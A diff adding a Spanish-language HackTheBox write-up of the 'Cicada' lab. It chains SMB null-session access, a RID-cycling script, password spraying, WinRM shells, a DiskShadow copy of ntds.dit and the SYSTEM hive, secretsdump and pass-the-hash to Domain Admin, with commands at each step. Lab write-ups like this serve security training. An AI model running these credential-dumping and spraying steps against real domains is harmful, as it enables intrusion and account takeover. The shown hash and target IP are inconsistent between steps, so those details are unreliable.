@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<!DOCTYPE html>
+
+<html lang="es">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>Cicada | ZsZsec</title>
+<meta content="AD básico muy bien encadenado: SMB null session, RID cycling, password spraying, WinRM, SeBackupPrivilege y dump de NTDS." name="description"/>
+<meta content="#000000" name="theme-color"/>
+<link href="../assets/favicon.svg" rel="icon" type="image/svg+xml"/>
+<link href="../assets/style.css" rel="stylesheet"/>
+</head>
+<body>
+<div class="scanline"></div>
+<header class="site-header">
+<a aria-label="Inicio" class="brand" href="../index.html"><span class="brand-mark">λ</span><span class="brand-text">ZsZsec</span></a>
+<nav aria-label="Navegación principal" class="nav"><a class="nav-link" href="../index.html">Inicio</a><a class="nav-link" href="../sobre-mi.html">Sobre mí</a><a class="nav-link" href="../articulos.html">Artículos</a><a class="nav-link active" href="../writeups.html">Writeups</a></nav>
+</header>
+<main>
+<section class="page-hero compact">
+<p class="eyebrow">HackTheBox</p>
+<h1>Cicada<span>_</span></h1>
+<div class="writeup-meta"><span>HackTheBox / Active Directory / SMB</span></div>
+<div class="tag-row"><span class="tag">HackTheBox</span><span class="tag">Active Directory</span><span class="tag">SMB</span><span class="tag">WinRM</span><span class="tag">SeBackupPrivilege</span></div>
+</section>
+<section class="content-shell">
+<article class="markdown-body"><h1>HTB — Cicada (Writeup)</h1>
+<h2>Información Inicial</h2>
+<ul>
+<li><strong>Target:</strong> <code>10.129.231.149</code> (DC)</li>
+<li><strong>Dominio:</strong> <code>cicada.htb</code></li>
+<li><strong>Hostname:</strong> <code>CICADA-DC</code></li>
+<li><strong>SO:</strong> Windows Server 2022 (AD Domain Controller)</li>
+</ul>
+<hr/>
+<h2>1. Enumeración Inicial</h2>
+<h3>Nmap</h3>
+<pre><code class="language-bash">nmap -p53,88,135,139,389,445,464,593,636,3268,5985,62579 -sC -sV -Pn --min-rate 4500 -oN exhaustivo 10.129.231.149
+</code></pre>
+<p><strong>Hallazgos importantes:</strong></p>
+<ul>
+<li><code>53</code> DNS</li>
+<li><code>88</code> Kerberos</li>
+<li><code>389/636/3268</code> LDAP (Active Directory)</li>
+<li><code>445</code> SMB</li>
+<li><code>5985</code> WinRM (posible shell si conseguimos credenciales)</li>
+<li>SMB signing requerido → no relay, pero sí autenticación normal.</li>
+</ul>
+<hr/>
+<h2>2. Acceso Inicial: Null Session en SMB + Archivo de HR</h2>
+<p>Se pudo conectar con <strong>SMB sin credenciales</strong> (null session) y descargar un archivo del share <strong>HR</strong>.</p>
+<p>Ese archivo contenía una contraseña:</p>
+<blockquote>
+<p><strong>No teníamos ningún usuario aún, solo una contraseña.</strong></p>
+</blockquote>
+<p>Esto es clave porque en AD muchas veces se reutilizan passwords entre usuarios.</p>
+<hr/>
+<h2>3. Enumeración del Dominio vía RPC (sin usuario)</h2>
+<p>Como el DC tenía <code>135</code> (RPC) abierto, se intentó enumerar usando la contraseña encontrada.</p>
+<pre><code class="language-bash">rpcclient -U ' ' 10.129.231.149
+</code></pre>
+<p>RPC pidió password para WORKGROUP. Se utilizó la contraseña obtenida desde HR.</p>
+<hr/>
+<h2>4. Enumeración de SIDs + RID Discovery</h2>
+<p>Dentro de <code>rpcclient</code>, enumeramos SIDs:</p>
+<pre><code class="language-bash">rpcclient $&gt; lsaenumsid
+</code></pre>
+<p>Dos entradas llamaron la atención porque parecían objetos del dominio:</p>
+<pre><code class="language-bash">S-1-5-21-917908876-1423158569-3159038727-1601
+S-1-5-21-917908876-1423158569-3159038727-1109
+</code></pre>
+<p>Para resolver el nombre asociado a esos SIDs:</p>
+<pre><code class="language-bash">rpcclient $&gt; lookupsids S-1-5-21-917908876-1423158569-3159038727-1601
+rpcclient $&gt; lookupsids S-1-5-21-917908876-1423158569-3159038727-1109
+</code></pre>
+<p>Resultado:</p>
+<ul>
+<li><code>CICADA\emily.oscars</code></li>
+<li><code>CICADA\Dev Support</code></li>
+</ul>
+<hr/>
+<h2>5. RID Bruteforce Manual → Confirmación</h2>
+<p>Probando un RID cercano:</p>
+<pre><code class="language-bash">rpcclient $&gt; lookupsids S-1-5-21-917908876-1423158569-3159038727-1108
+</code></pre>
+<p>Se obtuvo:</p>
+<ul>
+<li><code>CICADA\david.orelious</code></li>
+</ul>
+<p>Esto confirmó que el dominio permitía <strong>RID cycling / RID bruteforce</strong>, así que automatizamos.</p>
+<hr/>
+<h2>6. Script para Enumerar Usuarios por RID</h2>
+<p>Se creó un script para probar RIDs comunes (500–2000):</p>
+<pre><code class="language-bash">#!/bin/bash
+TARGET="10.129.231.149"
+PASSWORD="Cicada\$M6Corpb*@Lp#nZp!8"
+BASE_SID="S-1-5-21-917908876-1423158569-3159038727"
+OUTPUT="usuarios_enumerados.txt"
+
+&gt; $OUTPUT
+
+for rid in $(seq 500 2000); do
+    SID="${BASE_SID}-${rid}"
+    RESULT=$(rpcclient -U "%${PASSWORD}" -c "lookupsids ${SID}" $TARGET 2&gt;/dev/null)
+
+    if echo "$RESULT" | grep -q "CICADA"; then
+        echo "$RESULT" | tee -a $OUTPUT
+    fi
+done
+</code></pre>
+<p>Usuarios encontrados:</p>
+<ul>
+<li><code>john.smoulder</code></li>
+<li><code>sarah.dantelia</code></li>
+<li><code>michael.wrightson</code></li>
+<li><code>david.orelious</code></li>
+<li><code>emily.oscars</code></li>
+</ul>
+<h2>Nota: Enumeración RID más simple usando <code>guest</code></h2>
+<p>Durante la enumeración inicial intenté obtener usuarios con RID bruteforce usando herramientas como <code>netexec</code> (<code>--rid-brute</code>), pero al hacerlo sin especificar el usuario <code>guest</code> <strong>no se enumeraban correctamente los usuarios del dominio</strong>.</p>
+<p>Por esta razón terminé usando <code>rpcclient + lookupsids</code> y automatizando la enumeración con un script.</p>
+<p>Sin embargo, después me di cuenta de que era suficiente con ejecutar RID bruteforce autenticando como <code>guest</code> (sin contraseña), lo cual sí permite enumerar los usuarios del dominio de forma directa:</p>
+<pre><code class="language-bash">netexec smb 10.129.236.196 -u guest -p '' --rid-brute
+</code></pre>
+<p>Esto devuelve los mismos objetos (usuarios/grupos) que enumeré manualmente con <code>lookupsids</code>, pero de forma mucho más rápida y limpia.</p>
+<blockquote>
+<p>En esta resolución utilicé el método con script porque fue el primer enfoque que funcionó durante la explotación, pero en un escenario real la opción recomendada sería probar primero <code>--rid-brute</code> con <code>guest</code>.</p>
+</blockquote>
+<hr/>
+<h2>7. Password Spray con la contraseña inicial</h2>
+<p>Ya con usuarios, se realizó password spray usando la contraseña encontrada.</p>
+<p>Se detectó que funcionaba para:</p>
+<p><code>cicada.htb\michael.wrightson</code></p>
+<p>Ejemplo con NetExec:</p>
+<pre><code class="language-bash">netexec smb 10.129.236.196 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'
+</code></pre>
+<hr/>
+<h2>8. Enumeración AD con credenciales válidas (RPC)</h2>
+<p>Con acceso real como Michael, RPC permite más queries:</p>
+<pre><code class="language-bash">rpcclient -U 'michael.wrightson' 10.129.236.196
+</code></pre>
+<p>Enumeramos usuarios del dominio:</p>
+<pre><code class="language-bash">rpcclient $&gt; enumdomusers
+</code></pre>
+<hr/>
+<h2>9. Password en Description (AD Misconfiguration)</h2>
+<p>Se revisó información de un usuario específico:</p>
+<pre><code class="language-bash">rpcclient $&gt; queryuser 0x454
+</code></pre>
+<p>Output relevante:</p>
+<pre><code class="language-bash">Description : Just in case I forget my password is aRt$Lp#7t*VQ!3
+</code></pre>
+<p>Credenciales encontradas:</p>
+<ul>
+<li><strong>Usuario:</strong> <code>david.orelious</code></li>
+<li><strong>Password:</strong> <code>aRt$Lp#7t*VQ!3</code></li>
+</ul>
+<hr/>
+<h2>10. Acceso a SMB DEV → Credenciales en Script</h2>
+<p>Con David se accedió al share <code>DEV</code>:</p>
+<pre><code class="language-bash">smbclient //10.129.236.196/DEV -U david.orelious
+</code></pre>
+<p>Se descargó:</p>
+<ul>
+<li><code>Backup_script.ps1</code></li>
+</ul>
+<p>El script contenía credenciales hardcodeadas:</p>
+<pre><code class="language-powershell">$username = "emily.oscars"
+$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
+</code></pre>
+<p>🎯 Credenciales encontradas:</p>
+<ul>
+<li><strong>Usuario:</strong> <code>emily.oscars</code></li>
+<li><strong>Password:</strong> <code>Q!3@Lp#M6b*7t*Vt</code></li>
+</ul>
+<hr/>
+<h2>11. Acceso por WinRM (User Flag)</h2>
+<p>WinRM estaba abierto (<code>5985</code>), así que se obtuvo shell:</p>
+<pre><code class="language-bash">evil-winrm -i 10.129.236.196 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
+</code></pre>
+<hr/>
+<h1>Privilege Escalation — SeBackupPrivilege (Backup Operators)</h1>
+<h2>12. Enumeración de Privilegios</h2>
+<p>En la sesión:</p>
+<pre><code class="language-powershell">whoami /all
+</code></pre>
+<p>El usuario pertenecía a:</p>
+<ul>
+<li><code>BUILTIN\Backup Operators</code></li>
+</ul>
+<p>Lo cual otorga:</p>
+<ul>
+<li><code>SeBackupPrivilege</code></li>
+<li><code>SeRestorePrivilege</code></li>
+</ul>
+<p>Esto permite leer archivos protegidos como:</p>
+<ul>
+<li><code>C:\Windows\NTDS\ntds.dit</code></li>
+<li>HKLM\SYSTEM</li>
+</ul>
+<hr/>
+<h2>13. Problema: NTDS está en uso</h2>
+<p>No se puede copiar directamente porque AD lo mantiene bloqueado.</p>
+<hr/>
+<h2>14. Solución: Volume Shadow Copy con DiskShadow</h2>
+<p>Creamos un script DiskShadow en Linux:</p>
+<pre><code class="language-bash">cat &gt; diskshadow.txt &lt;&lt; 'EOF'
+set verbose on
+set metadata C:\Windows\Temp\meta.cab
+set context clientaccessible
+set context persistent
+begin backup
+add volume C: alias cdrive
+create
+expose %cdrive% E:
+end backup
+EOF
+
+unix2dos diskshadow.txt
+</code></pre>
+<p>Subimos y ejecutamos:</p>
+<pre><code class="language-powershell">upload diskshadow.txt
+diskshadow /s diskshadow.txt
+</code></pre>
+<p>Esto expone la copia como <code>E:\</code></p>
+<hr/>
+<h2>15. Dump de NTDS + SYSTEM</h2>
+<p>Desde la shadow copy:</p>
+<pre><code class="language-powershell">Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
+reg save hklm\system C:\Temp\system.bak
+</code></pre>
+<p>Descargamos:</p>
+<pre><code class="language-powershell">download C:\Temp\ntds.dit
+download C:\Temp\system.bak
+</code></pre>
+<hr/>
+<h2>16. Extracción de Hashes (Secretsdump)</h2>
+<pre><code class="language-bash">impacket-secretsdump -ntds ntds.dit -system system.bak LOCAL
+</code></pre>
+<p>Hash del Administrator:</p>
+<pre><code>Administrator:500:...:2b87e7c93a3e8a0ea4a5819370:::
+</code></pre>
+<hr/>
+<h2>17. Pass-the-Hash → Domain Admin</h2>
+<pre><code class="language-bash">evil-winrm -i 10.129.236.196 -u Administrator -H 2b87e7c93a3e8a0ea4a581937
+</code></pre>
+<p>Acceso total al DC → Root flag.</p>
+<hr/>
+<h1>Resumen Final del Ataque</h1>
+<ol>
+<li><strong>Null session SMB</strong> → archivo HR con password</li>
+<li><strong>RPC + lookupsids</strong> → RID cycling para obtener usuarios</li>
+<li><strong>Password spray</strong> → acceso como <code>michael.wrightson</code></li>
+<li><strong>queryuser</strong> → password en description (<code>david.orelious</code>)</li>
+<li><strong>SMB DEV</strong> → script PS1 con password (<code>emily.oscars</code>)</li>
+<li><strong>WinRM</strong> → shell</li>
+<li><strong>Backup Operators</strong> → <code>SeBackupPrivilege</code></li>
+<li><strong>DiskShadow + NTDS dump</strong></li>
+<li><strong>Secretsdump</strong> → hash de Administrator</li>
+<li><strong>Pass-the-Hash</strong> → DA / Root</li>
+</ol>
+<hr/>
+</article>
+</section>
+</main>
+<footer class="site-footer"><span>ZsZsec // Zikuta</span><span class="footer-dot">•</span><span>Offensive Security Notes</span></footer>
+</body>
+</html>
